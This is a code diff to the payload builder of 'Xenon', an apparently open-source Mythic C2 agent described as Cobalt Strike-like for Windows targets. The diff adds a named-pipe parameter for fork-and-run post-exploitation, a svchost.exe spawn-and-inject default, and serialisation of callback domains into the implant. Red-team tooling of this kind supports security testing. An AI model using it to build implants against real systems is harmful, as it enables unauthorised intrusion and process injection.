@@ -6,6 +6,8 @@ from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 from distutils.dir_util import copy_tree
 import asyncio, os, tempfile, base64
+from .utils.agent_global_settings import PROCESS_INJECT_KIT
+import os
 
 import donut
 
@@ -18,7 +20,7 @@ class XenonAgent(PayloadType):
     supported_os = [SupportedOS.Windows]
     wrapper = False
     wrapped_payloads = []
-    note = """A Cobalt Strike-like agent for Windows targets. Version: v0.0.1"""
+    note = """A Cobalt Strike-like agent for Windows targets. Version: v0.0.2"""
     supports_dynamic_loading = True
     c2_profiles = ["httpx"]
     mythic_encrypts = True
@@ -46,9 +48,16 @@ class XenonAgent(PayloadType):
         BuildParameter(
             name = "spawnto_process",
             parameter_type=BuildParameterType.String,
-            default_value="C:\\Windows\\System32\\svchost.exe",
-            description="Spawnto Process: Full path of process to use for spawn & inject commands.",
+            default_value="svchost.exe",
+            description="Spawnto Process: Process name to use for spawn & inject commands.",
+        ),
+        BuildParameter(
+            name = "default_pipename",
+            parameter_type=BuildParameterType.String,
+            default_value="xenon",
+            description="Default Pipe Name: String to use for named pipes.",
         )
+        
     ]
     agent_path = pathlib.Path(".") / "xenon" / "mythic"
     # agent_icon_path = agent_path / "agent_functions" / "xenon_agent.svg"
@@ -166,7 +175,26 @@ class XenonAgent(PayloadType):
         agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
         copy_tree(str(self.agent_code_path), agent_build_path.name)
 
-         
+
+        ###############################
+        ### Compile Postex named pipe stub ####
+        ###############################
+        
+        # CWD - Xenon/Payload_Type/xenon/
+        stub_dir = 'xenon/agent_code/stub'
+        
+        postex_pipename = self.get_parameter('default_pipename')
+        cmd_stub = f"make PIPENAME={postex_pipename}"
+        proc = await asyncio.create_subprocess_shell(cmd_stub, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=stub_dir)
+        stdout, stderr = await proc.communicate()
+        if proc.returncode != 0:
+            build_success = False
+            logging.error(f"Command failed with exit code {proc.returncode}")
+            logging.error(f"[stderr]: {stderr.decode()}")
+            raise Exception(cmd_stub)
+        else:
+            logging.info(f"[stdout]: {stdout.decode()}")
+        
         
         ###############################
         ### Initialize BOF Modules ####
@@ -289,6 +317,9 @@ class XenonAgent(PayloadType):
             # Process Injection Settings
             spawnto_process_path = self.get_parameter('spawnto_process')
             serialized_data += serialize_string(spawnto_process_path)
+            # Fork & Run default pipe name
+            inject_pipe_name = self.get_parameter('default_pipename')
+            serialized_data += serialize_string(inject_pipe_name)
 
             # Serialize number of hosts (callback domains)
             num_hosts = len(Config["callback_domains"])
@@ -384,6 +415,8 @@ class XenonAgent(PayloadType):
             ######################################
             #####     Payload Options         ####
             ######################################
+            
+            # Set DLL export function name
             if self.get_parameter('output_type') == 'dll' or self.get_parameter('output_type') == 'shellcode':
                 with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
                     content = f.read()    
